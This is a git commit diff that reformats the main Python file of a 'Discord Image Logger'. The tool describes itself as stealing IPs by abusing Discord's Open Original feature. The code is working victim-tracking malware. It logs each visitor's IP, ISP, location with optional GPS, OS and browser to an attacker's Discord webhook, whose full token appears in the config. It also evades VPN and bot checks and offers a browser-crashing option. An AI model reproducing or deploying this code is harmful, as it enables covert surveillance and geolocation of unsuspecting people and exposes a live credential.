5f6ca95700f556411af80421498325bf2489b241
GITHUBEATER1 <165263952+GITHUBEATER1@users.noreply.github.com>
2024-04-23 11:20:18 +0000

    Update main.py

--- api/main.py
+++ api/main.py
@@ -3,7 +3,10 @@
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
-import traceback, requests, base64, httpagentparser
+import traceback
+import requests
+import base64
+import httpagentparser
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
@@ -13,58 +16,57 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1222833253430460416/RYURZtndSfZ48y5OjxoV1uq4KskCM27DskQ2qj6dybnIuJyGv0sPCb6WBJH0EvfqZ5Pl",
-    "image": "https://us-tuna-sounds-images.voicemod.net/21e7f131-3a7e-420f-9fba-cf3a2df5f4a3-1668345989225.jpg", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "image": "https://us-tuna-sounds-images.voicemod.net/21e7f131-3a7e-420f-9fba-cf3a2df5f4a3-1668345989225.jpg",  # You can also have a custom image by using a URL argument
+    # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
+    "imageArgument": True,  # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "username": "Image Logger",  # Set this to the name you want the webhook to have
+    "color": 0x00FFFF,  # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
-    
-    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "crashBrowser": False,  # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
 
-    "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
+    "accurateLocation": True,  # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+
+    "message": {  # Show a custom message when the user opens the image
+        "doMessage": False,  # Enable the custom message?
+        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",  # Message to show
+        "richMessage": True,  # Enable rich text? (See README for more info)
     },
 
-    "vpnCheck": 1, # Prevents VPNs from triggering the alert
-                # 0 = No Anti-VPN
-                # 1 = Don't ping when a VPN is suspected
-                # 2 = Don't send an alert when a VPN is suspected
+    "vpnCheck": 1,  # Prevents VPNs from triggering the alert
+    # 0 = No Anti-VPN
+    # 1 = Don't ping when a VPN is suspected
+    # 2 = Don't send an alert when a VPN is suspected
 
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+    "linkAlerts": True,  # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
+    "buggedImage": True,  # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
-    "antiBot": 4, # Prevents bots from triggering the alert
-                # 0 = No Anti-Bot
-                # 1 = Don't ping when it's possibly a bot
-                # 2 = Don't ping when it's 100% a bot
-                # 3 = Don't send an alert when it's possibly a bot
-                # 4 = Don't send an alert when it's 100% a bot
-    
+    "antiBot": 4,  # Prevents bots from triggering the alert
+    # 0 = No Anti-Bot
+    # 1 = Don't ping when it's possibly a bot
+    # 2 = Don't ping when it's 100% a bot
+    # 3 = Don't send an alert when it's possibly a bot
+    # 4 = Don't send an alert when it's 100% a bot
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": False,  # Redirect to a webpage?
+        "page": "https://your-link.here"  # Link to the webpage to redirect to
     },
-
     # Please enter all values in correct format. Otherwise, it may break.
     # Do not edit anything below this, unless you know what you're doing.
     # NOTE: Hierarchy tree goes as follows:
     # 1) Redirect (If this is enabled, disables image and crash browser)
     # 2) Crash Browser (If this is enabled, disables image)
     # 3) Message (If this is enabled, disables image)
-    # 4) Image 
+    # 4) Image
 }
 
-blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
-                                                           # This feature is undocumented mainly due to it being for detecting bots better.
+blacklistedIPs = ("27", "104", "143", "164")  # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
+# This feature is undocumented mainly due to it being for detecting bots better.
+
 
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
@@ -74,37 +76,39 @@ def botCheck(ip, useragent):
     else:
         return False
 
-def reportError(error):
-    requests.post(config["webhook"], json = {
-    "username": config["username"],
-    "content": "@everyone",
-    "embeds": [
-        {
-            "title": "Image Logger - Error",
-            "color": config["color"],
-            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
-        }
-    ],
-})
 
-def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
+def reportError(error):
+    requests.post(config["webhook"], json={
+        "username": config["username"],
+        "content": "@everyone",
+        "embeds": [
+            {
+                "title": "Image Logger - Error",
+                "color": config["color"],
+                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
+            }
+        ],
+    })
+
+
+def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
     if ip.startswith(blacklistedIPs):
         return
-    
+
     bot = botCheck(ip, useragent)
-    
+
     if bot:
-        requests.post(config["webhook"], json = {
-    "username": config["username"],
-    "content": "",
-    "embeds": [
-        {
-            "title": "Image Logger - Link Sent",
-            "color": config["color"],
-            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
-        }
-    ],
-}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
+        requests.post(config["webhook"], json={
+            "username": config["username"],
+            "content": "",
+            "embeds": [
+                {
+                    "title": "Image Logger - Link Sent",
+                    "color": config["color"],
+                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+                }
+            ],
+        }) if config["linkAlerts"] else None  # Don't send an alert if the user has it disabled
         return
 
     ping = "@everyone"
@@ -112,11 +116,11 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
     if info["proxy"]:
         if config["vpnCheck"] == 2:
-                return
-        
+            return
+
         if config["vpnCheck"] == 1:
             ping = ""
-    
+
     if info["hosting"]:
         if config["antiBot"] == 4:
             if info["proxy"]:
@@ -125,7 +129,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
                 return
 
         if config["antiBot"] == 3:
-                return
+            return
 
         if config["antiBot"] == 2:
             if info["proxy"]:
@@ -134,22 +138,21 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
                 ping = ""
 
         if config["antiBot"] == 1:
-                ping = ""
-
+            ping = ""
 
     os, browser = httpagentparser.simple_detect(useragent)
-    
+
     embed = {
-    "username": config["username"],
-    "content": ping,
-    "embeds": [
-        {
-            "title": "Image Logger - IP Logged",
-            "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
+        "username": config["username"],
+        "content": ping,
+        "embeds": [
+            {
+                "title": "Image Logger - IP Logged",
+                "color": config["color"],
+                "description": f"""**A User Opened the Original Image!**
 
 **Endpoint:** `{endpoint}`
-            
+
 **IP Info:**
 > **IP:** `{ip if ip else 'Unknown'}`
 > **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
@@ -168,8 +171,6 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **Browser:** `{browser}`
 
 **User Agent:**
-```
-{useragent}
 ```""",
     }
   ],
